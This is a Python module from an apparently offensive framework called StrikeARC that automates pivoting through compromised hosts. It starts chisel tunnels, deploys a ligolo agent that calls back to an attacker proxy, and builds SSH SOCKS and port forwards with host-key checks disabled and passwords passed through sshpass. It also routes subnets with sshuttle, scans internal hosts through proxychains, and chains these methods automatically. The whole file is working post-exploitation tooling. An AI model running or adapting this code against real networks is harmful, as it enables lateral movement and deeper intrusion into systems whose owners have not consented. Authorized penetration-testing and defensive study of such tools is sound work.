"""
StrikeARC — Tunneling & Pivoting
=================================
Establishes network tunnels through compromised hosts to reach
internal networks. Supports chisel, ligolo, SSH port forwarding,
and dynamic SOCKS proxies.

Usage from nodes:
    from tools.tunnel import establish_tunnel, list_tunnels, kill_tunnel
"""

from __future__ import annotations

import os
import shutil
import socket
import subprocess
import time
from typing import Dict, List, Optional

from utils import run_command


# ── Tunnel Management ─────────────────────────────────────────────────

_active_tunnels: Dict[str, subprocess.Popen] = {}


def _find_free_port(start: int = 1080, end: int = 9999) -> int:
    """Find a free local port for tunneling."""
    for port in range(start, end):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            try:
                s.bind(("127.0.0.1", port))
                return port
            except OSError:
                continue
    raise RuntimeError("No free port available for tunnel")


def _check_tool(name: str) -> bool:
    """Check if a tool is installed."""
    return shutil.which(name) is not None


# ── Chisel ────────────────────────────────────────────────────────────

def start_chisel_server(
    transport=None,
    port: int = 8000,
    auth: Optional[str] = None,
) -> Dict:
    """Start chisel server on a compromised host.

    Requires chisel binary uploaded to the target first.
    """
    print(f"  [TUNNEL] Starting chisel server on port {port}...")

    cmd = f"chisel server --reverse --port {port}"
    if auth:
        cmd += f" --auth {auth}"

    if transport:
        result = transport.run(cmd)
    else:
        # Start locally (for testing)
        proc = subprocess.Popen(
            cmd.split(),
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            start_new_session=True,
        )
        tunnel_id = f"chisel_server_{port}"
        _active_tunnels[tunnel_id] = proc
        result = {"stdout": "", "stderr": "", "returncode": 0, "cmd": cmd}

    print(f"  [TUNNEL] Chisel server started (rc={result.get('returncode', 0)})")
    return {
        "success": result.get("returncode", 0) == 0,
        "tunnel_type": "chisel_server",
        "port": port,
        "tunnel_id": f"chisel_server_{port}",
    }


def start_chisel_client(
    server_host: str,
    server_port: int = 8000,
    local_socks_port: Optional[int] = None,
    auth: Optional[str] = None,
    reverse: bool = True,
) -> Dict:
    """Start chisel client locally to connect to a remote chisel server.

    Creates a SOCKS proxy that routes through the compromised host.
    """
    if not _check_tool("chisel"):
        print("  [TUNNEL] chisel not found locally")
        return {"success": False, "error": "chisel not installed"}

    if local_socks_port is None:
        local_socks_port = _find_free_port(1080, 1099)

    print(f"  [TUNNEL] Starting chisel client → {server_host}:{server_port}")
    print(f"  [TUNNEL] SOCKS proxy on 127.0.0.1:{local_socks_port}")

    # Build chisel client command
    auth_str = f"{auth}@" if auth else ""
    cmd_parts = [
        "chisel", "client",
        f"{auth_str}{server_host}:{server_port}",
    ]

    if reverse:
        # Reverse tunnel: server can reach us, plus we set up SOCKS
        cmd_parts.append(f"R:socks")
    cmd_parts.append(f"socks")

    cmd = " ".join(cmd_parts)
    proc = subprocess.Popen(
        cmd_parts,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        start_new_session=True,
    )

    tunnel_id = f"chisel_client_{server_host}_{local_socks_port}"
    _active_tunnels[tunnel_id] = proc

    # Wait briefly for connection
    time.sleep(3)
    if proc.poll() is not None:
        stdout, stderr = proc.communicate()
        print(f"  [TUNNEL] Chisel client failed: {stderr.decode()[:200]}")
        return {"success": False, "error": stderr.decode()[:500]}

    print(f"  [TUNNEL] ✓ Chisel tunnel established (SOCKS5 127.0.0.1:{local_socks_port})")
    return {
        "success": True,
        "tunnel_type": "chisel",
        "tunnel_id": tunnel_id,
        "local_socks_port": local_socks_port,
        "remote_host": server_host,
        "pid": proc.pid,
    }


# ── Ligolo-ng ─────────────────────────────────────────────────────────

def start_ligolo_proxy(
    local_port: int = 11601,
    interface_name: str = "ligolo0",
) -> Dict:
    """Start ligolo-ng proxy locally (selfproxy)."""
    if not _check_tool("ligolo_proxy") and not _check_tool("proxy"):
        print("  [TUNNEL] ligolo_proxy not found locally")
        return {"success": False, "error": "ligolo_proxy not installed"}

    binary = "ligolo_proxy" if _check_tool("ligolo_proxy") else "proxy"

    cmd_parts = [binary, "-l", f"0.0.0.0:{local_port}", "-selfcert"]
    print(f"  [TUNNEL] Starting ligolo proxy on :{local_port}")

    proc = subprocess.Popen(
        cmd_parts,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        start_new_session=True,
    )

    tunnel_id = f"ligolo_proxy_{local_port}"
    _active_tunnels[tunnel_id] = proc

    time.sleep(2)
    print(f"  [TUNNEL] ✓ Ligolo proxy listening (connect agents via :{local_port})")
    return {
        "success": True,
        "tunnel_type": "ligolo",
        "tunnel_id": tunnel_id,
        "local_port": local_port,
        "pid": proc.pid,
    }


def deploy_ligolo_agent(
    transport=None,
    proxy_host: str = "REVERSE_PROXY_IP",
    proxy_port: int = 11601,
) -> Dict:
    """Deploy ligolo agent on a compromised host.

    The agent connects back to our ligolo proxy, establishing a tunnel.
    Requires the agent binary to be uploaded first.
    """
    cmd = f"ligolo_agent -connect {proxy_host}:{proxy_port} -ignore-cert"

    print(f"  [TUNNEL] Deploying ligolo agent → {proxy_host}:{proxy_port}")

    if transport:
        result = transport.run(cmd)
    else:
        result = run_command(cmd, timeout=5)

    return {
        "success": result.get("returncode", -1) == 0,
        "tunnel_type": "ligolo_agent",
        "proxy_host": proxy_host,
        "proxy_port": proxy_port,
        "output": result.get("stdout", "")[:500],
    }


# ── SSH Tunnels ───────────────────────────────────────────────────────

def ssh_dynamic_tunnel(
    target_host: str,
    username: str,
    password: Optional[str] = None,
    key_path: Optional[str] = None,
    local_port: Optional[int] = None,
    remote_port: int = 22,
) -> Dict:
    """Create SSH dynamic SOCKS proxy through a host.

    sshpass -p 'PASS' ssh -D LOCAL_PORT -N -f USER@TARGET
    """
    if not _check_tool("sshpass") and not password:
        # Can use key-based auth without sshpass
        pass
    elif password and not _check_tool("sshpass"):
        return {"success": False, "error": "sshpass required for password auth"}

    if local_port is None:
        local_port = _find_free_port(1080, 1099)

    print(f"  [TUNNEL] SSH dynamic tunnel → {username}@{target_host}:{remote_port}")
    print(f"  [TUNNEL] SOCKS5 on 127.0.0.1:{local_port}")

    cmd_parts = ["ssh", "-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null"]

    if password:
        cmd = (
            f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no "
            f"-o UserKnownHostsFile=/dev/null -D {local_port} -N -f "
            f"-p {remote_port} {username}@{target_host}"
        )
    else:
        cmd_parts.extend([
            "-i", key_path or "~/.ssh/id_rsa",
            "-D", str(local_port), "-N", "-f",
            "-p", str(remote_port),
            f"{username}@{target_host}",
        ])
        cmd = " ".join(cmd_parts)

    result = run_command(cmd, timeout=10)

    if result["returncode"] == 0 or "Pseudo-terminal" in result.get("stderr", ""):
        tunnel_id = f"ssh_socks_{target_host}_{local_port}"
        print(f"  [TUNNEL] ✓ SSH SOCKS tunnel established (127.0.0.1:{local_port})")
        return {
            "success": True,
            "tunnel_type": "ssh_socks",
            "tunnel_id": tunnel_id,
            "local_socks_port": local_port,
            "remote_host": target_host,
        }

    print(f"  [TUNNEL] SSH tunnel failed: {result.get('stderr', '')[:200]}")
    return {
        "success": False,
        "error": result.get("stderr", "")[:500],
    }


def ssh_port_forward(
    target_host: str,
    username: str,
    remote_target: str,
    remote_target_port: int,
    local_port: Optional[int] = None,
    password: Optional[str] = None,
    key_path: Optional[str] = None,
    ssh_port: int = 22,
) -> Dict:
    """SSH local port forward: access internal host:port through compromised host.

    sshpass -p 'PASS' ssh -L LOCAL_PORT:INTERNAL_HOST:INTERNAL_PORT USER@PIVOT_HOST
    """
    if local_port is None:
        local_port = _find_free_port(9000, 9999)

    print(f"  [TUNNEL] SSH port forward: 127.0.0.1:{local_port} → {remote_target}:{remote_target_port} via {target_host}")

    if password:
        cmd = (
            f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no "
            f"-o UserKnownHostsFile=/dev/null -L {local_port}:{remote_target}:{remote_target_port} "
            f"-N -f -p {ssh_port} {username}@{target_host}"
        )
    else:
        cmd = (
            f"ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null "
            f"-i {key_path or '~/.ssh/id_rsa'} "
            f"-L {local_port}:{remote_target}:{remote_target_port} "
            f"-N -f -p {ssh_port} {username}@{target_host}"
        )

    result = run_command(cmd, timeout=10)

    if result["returncode"] == 0:
        tunnel_id = f"ssh_fwd_{target_host}_{local_port}"
        print(f"  [TUNNEL] ✓ Port forward established")
        return {
            "success": True,
            "tunnel_type": "ssh_forward",
            "tunnel_id": tunnel_id,
            "local_port": local_port,
            "remote_host": remote_target,
            "remote_port": remote_target_port,
            "via_host": target_host,
        }

    return {
        "success": False,
        "error": result.get("stderr", "")[:500],
    }


# ── SOCKS Proxy via sshuttle ──────────────────────────────────────────

def sshuttle_route(
    target_subnet: str,
    pivot_host: str,
    username: str,
    password: Optional[str] = None,
    key_path: Optional[str] = None,
) -> Dict:
    """Route traffic to a subnet through a compromised host via sshuttle.

    sshuttle -r USER@PIVOT_HOST SUBNET
    """
    if not _check_tool("sshuttle"):
        return {"success": False, "error": "sshuttle not installed"}

    print(f"  [TUNNEL] sshuttle {target_subnet} via {username}@{pivot_host}")

    if password:
        cmd = (
            f"sshpass -p '{password}' sshuttle -r {username}@{pivot_host} "
            f"--ssh-cmd 'sshpass -p {password} ssh' {target_subnet}"
        )
    else:
        cmd = f"sshuttle -r {username}@{pivot_host} {target_subnet}"

    proc = subprocess.Popen(
        cmd,
        shell=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        start_new_session=True,
    )

    tunnel_id = f"sshuttle_{pivot_host}_{target_subnet.replace('/', '_')}"
    _active_tunnels[tunnel_id] = proc

    time.sleep(3)
    if proc.poll() is None:
        print(f"  [TUNNEL] ✓ sshuttle routing {target_subnet} via {pivot_host}")
        return {
            "success": True,
            "tunnel_type": "sshuttle",
            "tunnel_id": tunnel_id,
            "target_subnet": target_subnet,
            "via_host": pivot_host,
            "pid": proc.pid,
        }

    stdout, stderr = proc.communicate()
    return {
        "success": False,
        "error": stderr.decode()[:500],
    }


# ── Tunnel Utilities ──────────────────────────────────────────────────

def list_active_tunnels() -> List[Dict]:
    """Return status of all active tunnels."""
    results = []
    for tid, proc in list(_active_tunnels.items()):
        status = "active" if proc.poll() is None else "dead"
        results.append({
            "tunnel_id": tid,
            "status": status,
            "pid": proc.pid if status == "active" else None,
        })
    return results


def kill_tunnel(tunnel_id: str) -> bool:
    """Kill a specific tunnel by ID."""
    proc = _active_tunnels.get(tunnel_id)
    if proc is None:
        return False

    try:
        import signal as sig
        os.killpg(os.getpgid(proc.pid), sig.SIGTERM)
    except (ProcessLookupError, PermissionError):
        proc.kill()

    proc.wait(timeout=5)
    del _active_tunnels[tunnel_id]
    print(f"  [TUNNEL] Killed {tunnel_id}")
    return True


def kill_all_tunnels():
    """Kill all active tunnels."""
    for tid in list(_active_tunnels.keys()):
        kill_tunnel(tid)


def scan_through_socks(
    socks_port: int,
    target_ip: str,
    target_ports: str = "--top-ports 20",
) -> Dict:
    """Run nmap through a SOCKS proxy to scan internal networks.

    Uses: proxychains nmap -sT TARGET
    """
    if not _check_tool("proxychains"):
        return {"success": False, "error": "proxychains not installed"}

    # Configure proxychains to use our SOCKS port
    proxy_conf = f"strict_chain\nproxy_dns\n[ProxyList]\nsocks5 127.0.0.1 {socks_port}\n"

    # Write temp proxychains config
    conf_path = f"/tmp/strikearc_proxychains_{socks_port}.conf"
    with open(conf_path, "w") as f:
        f.write(proxy_conf)

    cmd = f"proxychains -f {conf_path} nmap -sT -Pn {target_ports} {target_ip}"
    result = run_command(cmd, timeout=120)

    return {
        "success": result["returncode"] == 0,
        "output": result["stdout"][:2000],
    }


# ── Master Pivot Function ─────────────────────────────────────────────

def establish_pivot(
    pivot_host: str,
    target_subnet: str,
    credentials: Dict,
    preferred_method: str = "auto",
) -> Dict:
    """Establish a pivot to reach a new internal subnet.

    Tries methods in order: chisel > sshuttle > ssh_socks > ligolo
    """
    print(f"\n  [PIVOT] Establishing pivot to {target_subnet} via {pivot_host}")
    print(f"  [PIVOT] Preferred method: {preferred_method}")

    methods_tried = []

    # Try SSH-based first (most reliable)
    if preferred_method in ("auto", "ssh_socks"):
        password = credentials.get("password")
        key_path = credentials.get("key_path")
        username = credentials.get("username", "")

        result = ssh_dynamic_tunnel(
            target_host=pivot_host,
            username=username,
            password=password,
            key_path=key_path,
        )
        methods_tried.append({"method": "ssh_socks", "result": result})

        if result["success"]:
            # Also set up sshuttle for routing
            shuttle = sshuttle_route(
                target_subnet=target_subnet,
                pivot_host=pivot_host,
                username=username,
                password=password,
                key_path=key_path,
            )
            return {
                "success": True,
                "method": "ssh_socks",
                "socks_port": result["local_socks_port"],
                "sshuttle": shuttle,
                "target_subnet": target_subnet,
            }

    # Try chisel
    if preferred_method in ("auto", "chisel"):
        local_port = _find_free_port(1080, 1099)
        result = start_chisel_client(
            server_host=pivot_host,
            local_socks_port=local_port,
        )
        methods_tried.append({"method": "chisel", "result": result})

        if result["success"]:
            return {
                "success": True,
                "method": "chisel",
                "socks_port": result.get("local_socks_port", local_port),
                "target_subnet": target_subnet,
            }

    print(f"  [PIVOT] All methods failed: {[m['method'] for m in methods_tried]}")
    return {
        "success": False,
        "methods_tried": methods_tried,
    }
